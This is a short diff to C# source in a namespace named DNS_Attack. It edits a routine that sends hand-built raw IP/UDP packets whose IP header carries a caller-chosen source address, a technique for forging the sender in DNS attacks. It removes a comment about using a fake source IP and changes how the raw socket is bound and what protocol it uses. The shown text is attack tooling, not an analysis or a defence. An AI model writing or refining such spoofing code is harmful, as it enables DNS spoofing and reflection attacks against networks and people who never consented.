@@ -101,11 +101,7 @@ namespace DNS_Attack {
         }
 
         public static void SendUDPPacket(string sourceIP, int sourcePort, string destinationIP, int destinationPort, byte[] data) {
-            /* To perform an attack using a fake source IP address, we should use a local IP address
-             * in the following line of code, but the operating system drops IP packets with invalid
-             * source IP addresses, so the source IP needs to be valid, being the best variable to
-             * use in this case. */
-            Socket socket = GenerateSocket(IPAddress.Parse(sourceIP), sourcePort);
+            Socket socket = GenerateSocket(localhost, sourcePort);
             byte[] udpHeader = GenerateUDPHeader(sourcePort, destinationPort, data.Length);
             byte[] ipHeader = GenerateIPHeader(sourceIP, destinationIP, udpHeader.Length + data.Length);
             byte[] toSend = ConcatArrays(ipHeader, udpHeader, data);
@@ -118,7 +114,7 @@ namespace DNS_Attack {
         }
 
         private static Socket GenerateSocket(IPAddress localAddress, int localPort) {
-            Socket socket = new Socket(AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Raw, ProtocolType.IP);
+            Socket socket = new Socket(AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Raw, ProtocolType.Udp);
             socket.Bind(new IPEndPoint(localAddress, localPort));
             socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
             byte[] byTrue = new byte[4] { 1, 0, 0, 0 };
